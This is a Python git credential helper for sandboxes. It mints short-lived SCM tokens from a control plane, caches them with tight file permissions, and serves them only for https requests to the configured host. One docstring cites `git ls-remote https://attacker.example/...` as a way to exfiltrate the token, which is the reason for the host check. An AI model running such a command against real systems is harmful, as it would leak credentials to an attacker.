#!/usr/bin/env python3
"""
Git credential helper backed by the Open-Inspect control plane.

Implements git's `credential` protocol (see gitcredentials(7)) so that every
git operation inside the sandbox — fetch, push, ls-remote, submodule update —
fetches a fresh short-lived SCM credential on demand, instead of relying on a
token captured at sandbox-creation time.

Protocol summary (action = "get"):

    Input on stdin:  key=value lines terminated by an empty line
    Output on stdout: request context lines plus username=… and password=…

Caching: a successful response is persisted to `/run/oi/scm-creds.json` (mode
0600). Subsequent invocations return the cached credentials until they're
within `CACHE_REFRESH_BUFFER_SECONDS` of expiry. Concurrent invocations are
serialised with an advisory lock on a sibling file so two git commands racing
on first boot don't both call out to the control plane.

The cache is never used as a fallback for a failed refresh: if the control
plane rejects us, we exit non-zero. Stale tokens silently authenticating are
worse than visible failures.
"""

from __future__ import annotations

import contextlib
import fcntl
import json
import os
import sys
import time
from pathlib import Path
from typing import IO, TYPE_CHECKING, cast

import httpx

if TYPE_CHECKING:
    from collections.abc import Mapping

CACHE_DIR = Path(os.environ.get("OI_SCM_CRED_CACHE_DIR", "/run/oi"))
CACHE_FILE = CACHE_DIR / "scm-creds.json"
LOCK_FILE = CACHE_DIR / "scm-creds.lock"
CACHE_REFRESH_BUFFER_SECONDS = 5 * 60
REQUEST_TIMEOUT_SECONDS = 15
# Image-build sandboxes have no control plane to refresh against. They live
# for minutes, so we treat the injected token as good for one hour.
BUILD_MODE_TOKEN_TTL_SECONDS = 60 * 60


def _log(message: str) -> None:
    """Emit a diagnostic line to stderr.

    Stdout is reserved for the git credential protocol — anything written
    there that isn't `key=value` confuses git.
    """
    sys.stderr.write(f"[oi-git-credentials] {message}\n")


def _read_protocol_input(stream: IO[str]) -> dict[str, str]:
    """Read git's credential protocol input until a blank line."""
    parsed: dict[str, str] = {}
    for raw in stream:
        line = raw.rstrip("\n")
        if line == "":
            break
        key, sep, value = line.partition("=")
        if sep:
            parsed[key] = value
    return parsed


def _resolve_endpoint() -> tuple[str, str, str] | None:
    """Resolve control-plane URL, sandbox token, and session id from env.

    Returns ``None`` if any of the three are missing. The caller falls back
    to a static env-var token only when no control-plane context is present
    at all (used by image-build sandboxes).
    """
    control_plane_url = os.environ.get("CONTROL_PLANE_URL", "").rstrip("/")
    auth_token = os.environ.get("SANDBOX_AUTH_TOKEN", "")
    session_id = ""
    raw_session_config = os.environ.get("SESSION_CONFIG", "")
    if raw_session_config:
        try:
            config = json.loads(raw_session_config)
            session_id = config.get("sessionId") or config.get("session_id") or ""
        except (json.JSONDecodeError, AttributeError) as e:
            _log(f"invalid SESSION_CONFIG; cannot resolve broker session id: {e}")
            session_id = ""

    if not (control_plane_url and auth_token and session_id):
        return None
    return control_plane_url, auth_token, session_id


def _has_control_plane_context() -> bool:
    """Return true when this sandbox appears attached to a live session."""
    return bool(
        os.environ.get("CONTROL_PLANE_URL", "").strip()
        or os.environ.get("SANDBOX_AUTH_TOKEN", "").strip()
    )


def _credentials_from_env() -> dict[str, object] | None:
    """Build credentials from VCS_CLONE_TOKEN if present.

    Image-build sandboxes don't have a control plane to call, so the manager
    injects a one-shot token directly into the env.
    """
    token = os.environ.get("VCS_CLONE_TOKEN", "")
    if not token:
        return None
    username = os.environ.get("VCS_CLONE_USERNAME") or "x-access-token"
    return {
        "username": username,
        "password": token,
        "expires_at_epoch_ms": int((time.time() + BUILD_MODE_TOKEN_TTL_SECONDS) * 1000),
    }


def _is_authorized_request(input_lines: dict[str, str]) -> tuple[bool, str]:
    """Decide whether to serve credentials for this credential request.

    The system-wide helper would otherwise hand the SCM token to any host
    git resolves — a malicious submodule URL or `git ls-remote
    https://attacker.example/...` could exfiltrate the installation token. We
    scope by protocol and host. We deliberately do not scope to the session repo:
    the existing system uses installation-wide credentials, and setup/start hooks
    may clone sibling private repositories that the installation can access.

    * protocol must be ``https`` (never hand a token to a plaintext remote);
    * host must equal the configured ``VCS_HOST``.

    Returns ``(authorized, reason)`` so the caller can log the rejection.
    """
    protocol = input_lines.get("protocol", "").strip().lower()
    if protocol != "https":
        return False, f"protocol={protocol!r} is not https"

    requested_host = input_lines.get("host", "").strip().lower()
    if not requested_host:
        return False, "no host provided"
    expected_host = os.environ.get("VCS_HOST", "github.com").strip().lower()
    if requested_host != expected_host:
        return False, f"host={requested_host!r} (expected {expected_host!r})"

    return True, ""


def _read_cached() -> dict[str, object] | None:
    """Return the cached credentials if present and still within their TTL."""
    if not CACHE_FILE.exists():
        return None
    try:
        with CACHE_FILE.open("r", encoding="utf-8") as fp:
            raw_cached = json.load(fp)
    except (OSError, json.JSONDecodeError):
        return None
    if not isinstance(raw_cached, dict):
        return None
    cached = cast("dict[str, object]", raw_cached)

    expires_at_ms = cached.get("expires_at_epoch_ms")
    if not isinstance(expires_at_ms, int | float):
        return None

    seconds_remaining = expires_at_ms / 1000 - time.time()
    if seconds_remaining <= CACHE_REFRESH_BUFFER_SECONDS:
        return None

    if not (cached.get("username") and cached.get("password")):
        return None

    return cached


def _atomic_write_cache(payload: dict[str, object]) -> None:
    """Persist credentials to disk with restrictive permissions."""
    CACHE_DIR.mkdir(parents=True, exist_ok=True)
    tmp_path = CACHE_DIR / ".scm-creds.json.tmp"
    fd = os.open(str(tmp_path), os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    try:
        os.write(fd, json.dumps(payload).encode("utf-8"))
    finally:
        os.close(fd)
    tmp_path.replace(CACHE_FILE)


def _fetch_from_control_plane(endpoint: tuple[str, str, str]) -> dict[str, object]:
    """Mint a fresh credential set from the control plane."""
    control_plane_url, auth_token, session_id = endpoint
    url = f"{control_plane_url}/sessions/{session_id}/scm-credentials"

    with httpx.Client(timeout=REQUEST_TIMEOUT_SECONDS) as client:
        response = client.post(url, headers={"Authorization": f"Bearer {auth_token}"})

    if response.status_code != 200:
        body = response.text[:200]
        raise RuntimeError(f"control plane returned {response.status_code}: {body}")

    data = response.json()
    if not isinstance(data, dict) or not data.get("username") or not data.get("password"):
        raise RuntimeError("control plane response missing username/password")
    expires_at = data.get("expires_at_epoch_ms")
    if not isinstance(expires_at, int | float) or expires_at <= 0:
        # Fail loud rather than cache a credential that _read_cached would
        # immediately reject, which would silently refetch on every git op.
        raise RuntimeError("control plane response has invalid expires_at_epoch_ms")
    return data


def _get_credentials() -> dict[str, object]:
    """Return cached credentials if fresh, otherwise refresh under a lock.

    Prefers control-plane brokerage. Falls back to the static
    ``VCS_CLONE_TOKEN`` env var only when no control-plane context exists —
    that's how image-build sandboxes authenticate their one-shot clone.
    """
    endpoint = _resolve_endpoint()
    if endpoint is None:
        if _has_control_plane_context():
            raise RuntimeError(
                "Control plane environment is present but incomplete; "
                "refusing VCS_CLONE_TOKEN fallback"
            )
        env_creds = _credentials_from_env()
        if env_creds is None:
            raise RuntimeError(
                "Missing required environment: CONTROL_PLANE_URL, "
                "SANDBOX_AUTH_TOKEN, SESSION_CONFIG.sessionId "
                "(and no VCS_CLONE_TOKEN fallback)"
            )
        return env_creds

    cached = _read_cached()
    if cached is not None:
        return cached

    CACHE_DIR.mkdir(parents=True, exist_ok=True)
    with open(LOCK_FILE, "w", encoding="utf-8") as lock_fp:
        fcntl.flock(lock_fp.fileno(), fcntl.LOCK_EX)
        try:
            # Re-check after acquiring the lock: a concurrent helper may have
            # refreshed already.
            cached = _read_cached()
            if cached is not None:
                return cached

            fresh = _fetch_from_control_plane(endpoint)
            _atomic_write_cache(fresh)
            return fresh
        finally:
            fcntl.flock(lock_fp.fileno(), fcntl.LOCK_UN)


def _emit_response(input_lines: dict[str, str], credentials: dict[str, object]) -> None:
    """Write the protocol response (context lines + fresh username/password)."""
    for key, value in input_lines.items():
        if key in {"username", "password"}:
            continue
        sys.stdout.write(f"{key}={value}\n")
    sys.stdout.write(f"username={credentials['username']}\n")
    sys.stdout.write(f"password={credentials['password']}\n")
    sys.stdout.write("\n")
    sys.stdout.flush()


def _gh_wrapper_should_mint(env: Mapping[str, str]) -> bool:
    """Decide whether the gh CLI needs a freshly-minted token.

    gh reads ``GH_TOKEN`` then ``GITHUB_TOKEN`` from its own environment, so
    we mint only when the environment has nothing usable: no user-provided
    token, and either nothing at all or just the system's short-lived
    installation fallback (marked ``OI_GITHUB_TOKEN_IS_FALLBACK=1``, which
    expires in ~1h and must be refreshed). A user-provided token always wins.

    The marker is authoritative on its own: a value comparison between
    ``GITHUB_TOKEN`` and ``GITHUB_APP_TOKEN`` is not needed to detect a user
    override, because the manager only sets the marker when it injected both
    values itself.
    """
    if env.get("VCS_HOST", "github.com").strip().lower() != "github.com":
        return False  # non-github deployment: never touch gh's own auth
    if env.get("GH_TOKEN"):
        return False  # user-owned; the manager never injects GH_TOKEN
    if env.get("OI_GITHUB_TOKEN_IS_FALLBACK") == "1":
        return True  # only the expiring system fallback is present → refresh
    # Otherwise mint only when there's no genuine user token to leave alone.
    return not (env.get("GITHUB_TOKEN") or env.get("GITHUB_APP_TOKEN"))


def _print_gh_token() -> int:
    """Print a freshly-minted token for the gh CLI wrapper, or nothing.

    The wrapper exports whatever we print as ``GH_TOKEN``. When the
    environment already has a usable token we print nothing so gh uses its
    own env. A failed mint also prints nothing rather than failing: the
    wrapper then falls through to the existing env instead of aborting gh.
    Both cases exit 0 — the wrapper only needs the stdout, not the status.
    """
    if not _gh_wrapper_should_mint(os.environ):
        return 0
    try:
        credentials = _get_credentials()
    except Exception as e:
        _log(f"failed to obtain gh token: {e}")
        return 0
    sys.stdout.write(str(credentials["password"]))
    sys.stdout.flush()
    return 0


def main(argv: list[str] | None = None) -> int:
    args = list(argv if argv is not None else sys.argv[1:])
    action = args[0] if args else "get"

    # `gh-token` is for the gh CLI wrapper: print a fresh token when the env
    # has none usable, otherwise nothing (see _print_gh_token).
    if action == "gh-token":
        return _print_gh_token()

    # We only mint credentials on `get`. `store` and `erase` are no-ops:
    # the control plane owns the truth and we don't persist anything git tells us.
    if action != "get":
        # Drain stdin so git doesn't see a SIGPIPE on the next helper.
        with contextlib.suppress(OSError):
            sys.stdin.read()
        return 0

    input_lines = _read_protocol_input(sys.stdin)

    # Scope the request to https on the configured host. git treats an empty
    # response as "I have nothing", so returning 0 with no output lets it fall
    # through to any other helper or fail the auth cleanly — without us ever
    # emitting the token to the wrong host.
    authorized, reason = _is_authorized_request(input_lines)
    if not authorized:
        _log(f"refusing to serve credentials: {reason}")
        return 0

    try:
        credentials = _get_credentials()
    except Exception as e:
        _log(f"failed to obtain credentials: {e}")
        return 1

    _emit_response(input_lines, credentials)
    return 0


if __name__ == "__main__":
    sys.exit(main())
